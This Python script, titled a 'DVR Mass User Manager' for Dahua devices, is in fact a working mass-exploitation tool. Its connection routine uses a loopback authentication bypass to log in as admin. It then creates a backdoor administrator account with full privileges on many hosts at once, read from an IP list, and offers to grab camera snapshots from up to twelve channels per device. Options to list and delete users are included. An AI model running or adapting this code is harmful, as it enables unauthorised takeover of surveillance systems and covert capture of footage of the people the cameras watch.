#!/usr/bin/env python3
"""
DVR Mass User Manager - Dahua Compatible (Multithread)
"""
import subprocess
import signal
import requests
from requests.auth import HTTPDigestAuth
import socket
import json
import struct
import sys
import hashlib
import re
import argparse
import time
import requests
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Configurações padrão
DEFAULT_NEW_USER = "pdr"
DEFAULT_NEW_PASS = "Senha@2026"
DEFAULT_PORT = 80
DEFAULT_THREADS = 5
TIMEOUT = 10

print_lock = threading.Lock()

def print_safe(message, end="\n"):
    with print_lock:
        print(message, end=end)
        sys.stdout.flush()

def dahua_gen2_md5_hash(dh_realm, username, password):
    """Hash Gen2 - Formato: MD5(username:realm:password) em MAIÚSCULAS"""
    to_hash = f"{username}:{dh_realm}:{password}"
    return hashlib.md5(to_hash.encode('utf-8')).hexdigest().upper()

def interceptar_realm(dados):
    try:
        if isinstance(dados, bytes):
            dados = dados.decode('latin-1', errors='ignore')
        if '"realm"' in dados:
            match = re.search(r'"realm":"([^"]+)"', dados)
            if match:
                return match.group(1)
    except:
        pass
    return None

def limpar_buffer(sock):
    try:
        sock.settimeout(0.1)
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
    except socket.timeout:
        pass
    finally:
        sock.settimeout(TIMEOUT)

def enviar_comando(sock, query, session_id, timeout=15):
    limpar_buffer(sock)
    
    header_magic = struct.pack('>Q', 0x2000000044484950)
    json_bytes = json.dumps(query).encode('latin-1')
    
    cmd_id = query.get('id', 1)
    
    header_payload = struct.pack('<I', session_id) + struct.pack('<I', cmd_id) + struct.pack('<I', len(json_bytes)) + struct.pack('<I', 0) + struct.pack('<I', len(json_bytes)) + struct.pack('<I', 0)
    packet = header_magic + header_payload + json_bytes
    
    sock.sendall(packet)
    sock.settimeout(timeout)
    
    try:
        resp_header = b""
        while len(resp_header) < 32:
            chunk = sock.recv(32 - len(resp_header))
            if not chunk:
                break
            resp_header += chunk
        
        if len(resp_header) == 32:
            resp_len = struct.unpack('<I', resp_header[16:20])[0]
            resp_body = b""
            while len(resp_body) < resp_len:
                chunk = sock.recv(min(65536, resp_len - len(resp_body)))
                if not chunk:
                    break
                resp_body += chunk
            
            try:
                return json.loads(resp_body.decode('latin-1'))
            except:
                resp_str = resp_body.decode('latin-1', errors='ignore')
                start = resp_str.find('{')
                end = resp_str.rfind('}')
                if start != -1 and end != -1 and end > start:
                    try:
                        return json.loads(resp_str[start:end+1])
                    except:
                        pass
                return None
    except:
        return None
    
    return None

def conectar_dvr(host, port):
    """Conecta a um DVR e obtém realm e sessão"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))
        
        first_login = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "password": "",
                "clientType": "Console",
                "loginType": "Direct"
            },
            "id": 1,
            "session": 0
        }
        
        data = enviar_comando(sock, first_login, 0)
        
        if not data:
            sock.close()
            return None, None, None
        
        session_alvo = data.get("session")
        realm = data.get("params", {}).get("realm")
        
        if not realm:
            realm = "Dahua"
        
        admin_hash = dahua_gen2_md5_hash(realm, "admin", "admin")
        
        bypass_login = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "ipAddr": "127.0.0.1",
                "loginType": "Loopback",
                "clientType": "Local",
                "authorityType": "Default",
                "passwordType": "Default",
                "password": admin_hash
            },
            "id": 2,
            "session": session_alvo
        }
        
        data = enviar_comando(sock, bypass_login, session_alvo)
        
        if data and data.get("result"):
            return sock, data.get("session"), realm
        else:
            sock.close()
            return None, None, None
            
    except Exception as e:
        return None, None, None

def adicionar_usuario_dvr(sock, session_alvo, username, password, realm):
    """Adiciona usuário usando o realm correto do DVR"""
    password_hash = dahua_gen2_md5_hash(realm, username, password)
    
    authority_list = [
        "Monitor",
        "Monitor_01", "Monitor_02", "Monitor_03", "Monitor_04",
        "Monitor_05", "Monitor_06", "Monitor_07", "Monitor_08",
        "Monitor_09", "Monitor_10", "Monitor_11", "Monitor_12",
        "Monitor_13", "Monitor_14", "Monitor_15", "Monitor_16",
        "Replay",
        "Replay_01", "Replay_02", "Replay_03", "Replay_04",
        "Replay_05", "Replay_06", "Replay_07", "Replay_08",
        "Replay_09", "Replay_10", "Replay_11", "Replay_12",
        "Replay_13", "Replay_14", "Replay_15", "Replay_16",
        "AuthUserMag", "AuthSysCfg", "AuthSysInfo", "AuthManuCtr",
        "AuthStoreCfg", "AuthEventCfg", "AuthNetCfg",
        "AuthRmtDevice", "AuthSecurity", "AuthBackup", "AuthMaintence"
    ]
    
    query = {
        "method": "userManager.addUser",
        "params": {
            "user": {
                "Name": username,
                "Password": password_hash,
                "Group": "admin",
                "AuthorityList": authority_list,
                "Sharable": True,
                "Reserved": False,
                "Type": "Normal",
                "MaxMonitorChannels": 0
            }
        },
        "id": 20,
        "session": session_alvo
    }
    
    data = enviar_comando(sock, query, session_alvo)
    
    if data and data.get("result"):
        return True, password_hash
    return False, None

def listar_usuarios(sock, session_alvo):
    """Lista todos os usuários do sistema"""
    query = {
        "method": "userManager.getUserInfoAll",
        "params": {},
        "id": 3,
        "session": session_alvo
    }
    
    data = enviar_comando(sock, query, session_alvo, timeout=30)
    
    if data and data.get("result") and "users" in data.get("params", {}):
        return data["params"]["users"]
    return []

def capturar_snapshot(host, port, username, password, canal, output_dir="snapshots"):
    """Captura snapshot com Digest Auth + melhorias"""
    try:
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        url = f"http://{host}:{port}/cgi-bin/snapshot.cgi?channel={canal}"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'image/jpeg',
            'Referer': f'http://{host}:{port}/',
            'Connection': 'keep-alive'
        }

        response = requests.get(
            url,
            auth=HTTPDigestAuth(username, password),
            headers=headers,
            timeout=12,
            stream=True
        )

        content = response.content

        if response.status_code == 200 and content and len(content) > 5000 and content.startswith(b'\xff\xd8'):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{output_dir}/{host}_ch{canal}_{timestamp}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(content)
            
            return True, filename, len(content)

    except Exception:
        pass

    return False, None, 0

def processar_dvr_adicionar(host, port, novo_user, nova_senha, index, total):
    """Processa um único DVR para adicionar usuário - Versão Otimizada"""
    resultado = {
        "host": host,
        "port": port,
        "status": False,
        "message": "",
        "realm": ""
    }
   
    try:
        # Print mais leve
        print_safe(f"[{index}/{total}] 🔄 {host}:{port}")
       
        sock, session, realm = conectar_dvr(host, port)
       
        if not sock:
            resultado["message"] = "Falha na conexão"
            print_safe(f"[{index}/{total}] ❌ {host}:{port} - Falha conexão")
            return resultado
       
        resultado["realm"] = realm
       
        sucesso, _ = adicionar_usuario_dvr(sock, session, novo_user, nova_senha, realm)
       
        if sucesso:
            resultado["status"] = True
            resultado["message"] = "Usuário criado"
            print_safe(f"[{index}/{total}] ✅ {host}:{port} - OK")
        else:
            resultado["message"] = "Falha ao criar"
            print_safe(f"[{index}/{total}] ⚠️ {host}:{port} - Falha")
       
        sock.close()
       
    except Exception as e:
        resultado["message"] = "Erro"
        print_safe(f"[{index}/{total}] ❌ {host}:{port} - Erro")
   
    return resultado

def processar_dvr_snapshot(host, port, username, password, index, total, output_dir="snapshots"):
    """Processa um único DVR para capturar snapshots"""
    resultado = {
        "host": host,
        "port": port,
        "status": False,
        "snapshots": [],
        "message": ""
    }
    
    try:
        print_safe(f"[{index}/{total}] 📸 Capturando snapshots de {host}:{port}...")
        
        canais = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
        snapshots_capturados = []
        
        for canal in canais:
            sucesso, filename, tamanho = capturar_snapshot(host, port, username, password, canal, output_dir)
            if sucesso:
                snapshots_capturados.append({
                    "canal": canal,
                    "arquivo": filename,
                    "tamanho": tamanho
                })
                print_safe(f"    ✅ Canal {canal}: OK ({tamanho/1024:.1f} KB)")
            else:
                print_safe(f"    ❌ Canal {canal}: Falhou")
            
            time.sleep(0.5)
        
        if snapshots_capturados:
            resultado["status"] = True
            resultado["snapshots"] = snapshots_capturados
            resultado["message"] = f"{len(snapshots_capturados)} snapshots capturados"
        else:
            resultado["message"] = "Nenhum snapshot capturado"
        
        print_safe(f"[{index}/{total}] {'✅' if resultado['status'] else '⚠️'} {host}:{port} - {resultado['message']}")
        
    except Exception as e:
        resultado["message"] = str(e)[:50]
        print_safe(f"[{index}/{total}] ❌ {host}:{port} - Erro: {str(e)[:50]}")
    
    return resultado

def ler_ips_do_arquivo(arquivo):
    """Lê lista de IPs de um arquivo"""
    ips = []
    try:
        with open(arquivo, 'r') as f:
            for linha in f:
                linha = linha.strip()
                if linha and not linha.startswith('#'):
                    if ':' in linha:
                        ip, porta = linha.split(':')
                        ips.append((ip, int(porta)))
                    else:
                        ips.append((linha, DEFAULT_PORT))
    except Exception as e:
        print_safe(f"[-] Erro ao ler arquivo: {e}")
        return []
    return ips

def modo_massa_adicionar(arquivo_ips, porta_padrao, novo_user, nova_senha, num_threads):
    """Adiciona usuário em múltiplos DVRs"""
    print_safe("\n" + "="*60)
    print_safe("     MODO MASSA - ADICIONANDO USUÁRIOS")
    print_safe("="*60)
    print_safe(f"Arquivo: {arquivo_ips}")
    print_safe(f"Usuário a criar: {novo_user}")
    print_safe(f"Threads: {num_threads}")
    print_safe("="*60)
    
    ips_portas = ler_ips_do_arquivo(arquivo_ips)
    
    if not ips_portas:
        print_safe("[-] Nenhum IP encontrado!")
        return
    
    if porta_padrao != DEFAULT_PORT:
        ips_portas = [(ip, porta_padrao) for ip, _ in ips_portas]
    
    print_safe(f"\n[+] Total de DVRs: {len(ips_portas)}")
    
    sucessos = []
    falhas = []
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {}
        for i, (ip, porta) in enumerate(ips_portas, 1):
            future = executor.submit(processar_dvr_adicionar, ip, porta, novo_user, nova_senha, i, len(ips_portas))
            futures[future] = ip
        
        for future in as_completed(futures):
            resultado = future.result()
            if resultado["status"]:
                sucessos.append(resultado)
            else:
                falhas.append(resultado)
    
    elapsed_time = time.time() - start_time
    
    print_safe("\n" + "="*60)
    print_safe(" RELATÓRIO FINAL - ADIÇÃO")
    print_safe("="*60)
    print_safe(f"Tempo: {elapsed_time:.2f}s | Velocidade: {len(ips_portas)/elapsed_time:.2f} DVRs/s")
    print_safe(f"\n✅ SUCESSOS: {len(sucessos)}")
    for r in sucessos:
        print_safe(f"    ✅ {r['host']}:{r['port']} - {r['message']}")
    print_safe(f"\n❌ FALHAS: {len(falhas)}")
    for r in falhas:
        print_safe(f"    ❌ {r['host']}:{r['port']} - {r['message']}")
    
    if sucessos:
        sucessos_file = f"dvr_sucesso_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(sucessos_file, 'w') as f:
            f.write(f"# DVRs com usuário '{novo_user}' criado\n")
            f.write(f"# Data: {datetime.now()}\n")
            f.write(f"# Formato: IP:PORTA\n\n")
            for r in sucessos:
                f.write(f"{r['host']}:{r['port']}\n")
        print_safe(f"\n📄 Lista de sucessos salva em: {sucessos_file}")
        
        resp = input(f"\n📸 Deseja capturar snapshots dos {len(sucessos)} DVRs? (s/N): ").strip().lower()
        if resp == 's':
            modo_massa_snapshot(sucessos_file, novo_user, nova_senha, num_threads)

def modo_massa_snapshot(arquivo_ips, username, password, num_threads):
    """Captura snapshots de múltiplos DVRs"""
    print_safe("\n" + "="*60)
    print_safe("     MODO MASSA - CAPTURANDO SNAPSHOTS")
    print_safe("="*60)
    
    ips_portas = ler_ips_do_arquivo(arquivo_ips)
    
    if not ips_portas:
        print_safe("[-] Nenhum IP encontrado!")
        return
    
    print_safe(f"\n[+] Total de DVRs para snapshots: {len(ips_portas)}")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"snapshots_{timestamp}"
    
    sucessos = []
    falhas = []
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {}
        for i, (ip, porta) in enumerate(ips_portas, 1):
            future = executor.submit(processar_dvr_snapshot, ip, porta, username, password, i, len(ips_portas), output_dir)
            futures[future] = ip
        
        for future in as_completed(futures):
            resultado = future.result()
            if resultado["status"]:
                sucessos.append(resultado)
            else:
                falhas.append(resultado)
    
    elapsed_time = time.time() - start_time
    
    print_safe("\n" + "="*60)
    print_safe(" RELATÓRIO FINAL - SNAPSHOTS")
    print_safe("="*60)
    print_safe(f"Tempo: {elapsed_time:.2f}s")
    print_safe(f"Diretório: {output_dir}/")
    print_safe(f"\n✅ SUCESSOS: {len(sucessos)}")
    for r in sucessos:
        print_safe(f"    ✅ {r['host']}:{r['port']} - {r['message']}")
    print_safe(f"\n❌ FALHAS: {len(falhas)}")
    for r in falhas:
        print_safe(f"    ❌ {r['host']}:{r['port']} - {r['message']}")
    
    total_snapshots = sum(len(r['snapshots']) for r in sucessos)
    print_safe(f"\n📊 Total de snapshots capturados: {total_snapshots}")
    
    relatorio_file = f"{output_dir}/relatorio.txt"
    with open(relatorio_file, 'w') as f:
        f.write(f"RELATÓRIO DE SNAPSHOTS - {datetime.now()}\n")
        f.write(f"{'='*60}\n\n")
        for r in sucessos:
            f.write(f"✅ {r['host']}:{r['port']}\n")
            for s in r['snapshots']:
                f.write(f"    Canal {s['canal']}: {s['arquivo']} ({s['tamanho']} bytes)\n")
        f.write(f"\n❌ FALHAS: {len(falhas)}\n")
        for r in falhas:
            f.write(f"    ❌ {r['host']}:{r['port']} - {r['message']}\n")
    
    print_safe(f"\n📄 Relatório salvo em: {relatorio_file}")

def menu_interativo():
    """Menu interativo para gerenciamento manual de um DVR"""
    print_safe("\n" + "="*60)
    print_safe("     MODO INTERATIVO - DVR MANAGEMENT TOOL")
    print_safe("="*60)
    
    host = input("IP do DVR: ").strip()
    if not host:
        print_safe("[-] IP obrigatório!")
        return
    
    try:
        porta = int(input("Porta (80 ou 37777) [80]: ").strip() or "80")
    except:
        porta = 80
    
    print_safe(f"\n[*] Conectando a {host}:{porta}...")
    sock, session, realm = conectar_dvr(host, porta)
    
    if not sock:
        print_safe("[-] Falha na conexão!")
        return
    
    print_safe(f"\n[+] ✅ Conectado! Realm: {realm}\n")
    
    while True:
        print_safe("\n" + "="*60)
        print_safe("     GERENCIADOR DE USUÁRIOS DO DVR")
        print_safe(f"     DVR: {host}:{porta}")
        print_safe("="*60)
        print_safe("1. 📋 Listar usuários")
        print_safe("2. ➕ Criar novo usuário")
        print_safe("3. ❌ Deletar usuário")
        print_safe("4. 📸 Capturar snapshot")
        print_safe("0. 🚪 Sair")
        print_safe("-"*60)
        
        opcao = input("\nEscolha uma opção: ").strip()
        
        if opcao == "1":
            users = listar_usuarios(sock, session)
            if users:
                print_safe(f"\n[+] Total: {len(users)} usuários")
                for u in users:
                    print_safe(f"    👤 {u.get('Name')} (Grupo: {u.get('Group')}, ID: {u.get('Id')})")
            else:
                print_safe("[-] Falha ao listar usuários")
        elif opcao == "2":
            username = input("Nome do novo usuário: ").strip()
            password = input("Senha: ").strip()
            if username and password:
                sucesso, _ = adicionar_usuario_dvr(sock, session, username, password, realm)
                if sucesso:
                    print_safe(f"[+] ✅ Usuário '{username}' criado!")
                else:
                    print_safe("[-] Falha ao criar usuário!")
            else:
                print_safe("[-] Nome e senha obrigatórios!")
        elif opcao == "3":
            username = input("Nome do usuário a deletar: ").strip()
            if username:
                query = {
                    "method": "userManager.deleteUser",
                    "params": {"name": username},
                    "id": 30,
                    "session": session
                }
                data = enviar_comando(sock, query, session)
                if data and data.get("result"):
                    print_safe(f"[+] ✅ Usuário '{username}' deletado!")
                else:
                    print_safe(f"[-] Falha ao deletar: {data}")
        elif opcao == "4":
            username = input("Usuário para autenticação: ").strip()
            password = input("Senha: ").strip()
            if username and password:
                try:
                    canal = int(input("Número do canal (1-8): ").strip())
                    output_dir = input("Diretório para salvar [snapshots]: ").strip() or "snapshots"
                    sucesso, filename, tamanho = capturar_snapshot(host, porta, username, password, canal, output_dir)
                    if sucesso:
                        print_safe(f"[+] ✅ Snapshot salvo: {filename} ({tamanho/1024:.1f} KB)")
                    else:
                        print_safe("[-] Falha ao capturar snapshot")
                except ValueError:
                    print_safe("[-] Canal inválido!")
            else:
                print_safe("[-] Usuário e senha obrigatórios!")
        elif opcao == "0":
            print_safe("\n[*] Encerrando...")
            break
        else:
            print_safe("[-] Opção inválida!")
    
    sock.close()

def main():
    parser = argparse.ArgumentParser(description='DVR Mass User Manager - Dahua Compatible')
    parser.add_argument('-f', '--file', help='Arquivo com lista de IPs (um por linha)')
    parser.add_argument('-i', '--ip', help='IP único do DVR')
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help=f'Porta (padrão: {DEFAULT_PORT})')
    parser.add_argument('-u', '--user', default=DEFAULT_NEW_USER, help=f'Usuário a criar (padrão: {DEFAULT_NEW_USER})')
    parser.add_argument('-P', '--password', default=DEFAULT_NEW_PASS, help=f'Senha (padrão: {DEFAULT_NEW_PASS})')
    parser.add_argument('-t', '--threads', type=int, default=DEFAULT_THREADS, help=f'Threads (padrão: {DEFAULT_THREADS})')
    parser.add_argument('--list', action='store_true', help='Listar usuários')
    parser.add_argument('--snapshot', action='store_true', help='Capturar snapshots (usar com -f)')
    parser.add_argument('--delete', action='store_true', help='Deletar usuário (requer -u)')
    
    args = parser.parse_args()
    
    print_safe("""
    ╔══════════════════════════════════════════════════════════╗
    ║     DVR MASS USER MANAGER - Dahua Compatible             ║
    ║                                                          ║
    ║  Modos de uso:                                           ║
    ║    • Interativo: python3 dh.py                          ║
    ║    • Adicionar: python3 dh.py -f ips.txt -u pdr -P pass -t 10
    ║    • Snapshot: python3 dh.py -f dvr_sucesso.txt --snapshot -u pdr -P pass -t 10
    ║    • Single: python3 dh.py -i 192.168.0.15 -u pdr -P pass
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) == 1:
        menu_interativo()
    elif args.file and args.snapshot:
        if not args.user or not args.password:
            print_safe("[-] Para snapshots, use -u USUARIO e -P SENHA")
            return
        modo_massa_snapshot(args.file, args.user, args.password, args.threads)
    elif args.file:
        modo_massa_adicionar(args.file, args.port, args.user, args.password, args.threads)
    elif args.ip:
        print_safe(f"\n[*] Conectando a {args.ip}:{args.port}...")
        sock, session, realm = conectar_dvr(args.ip, args.port)
        if sock:
            if args.list:
                users = listar_usuarios(sock, session)
                if users:
                    print_safe(f"\n[+] Usuários em {args.ip}:")
                    for u in users:
                        print_safe(f"    👤 {u.get('Name')} (Grupo: {u.get('Group')})")
                else:
                    print_safe("[-] Falha ao listar")
            elif args.snapshot:
                for canal in range(1, 5):
                    sucesso, filename, tamanho = capturar_snapshot(args.ip, args.port, args.user, args.password, canal)
                    if sucesso:
                        print_safe(f"✅ Canal {canal}: {filename} ({tamanho/1024:.1f} KB)")
                    else:
                        print_safe(f"❌ Canal {canal}: Falhou")
                    time.sleep(0.5)
            elif args.delete and args.user:
                query = {
                    "method": "userManager.deleteUser",
                    "params": {"name": args.user},
                    "id": 30,
                    "session": session
                }
                data = enviar_comando(sock, query, session)
                if data and data.get("result"):
                    print_safe(f"✅ Usuário '{args.user}' deletado")
                else:
                    print_safe(f"❌ Falha ao deletar: {data}")
            elif args.user and args.password:
                sucesso, _ = adicionar_usuario_dvr(sock, session, args.user, args.password, realm)
                print_safe(f"\n{'✅' if sucesso else '❌'} Usuário '{args.user}' {'criado' if sucesso else 'falhou'}")
            else:
                print_safe("[-] Especifique --list, --snapshot, --delete, ou -u e -P")
            sock.close()
        else:
            print_safe("[-] Falha na conexão")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
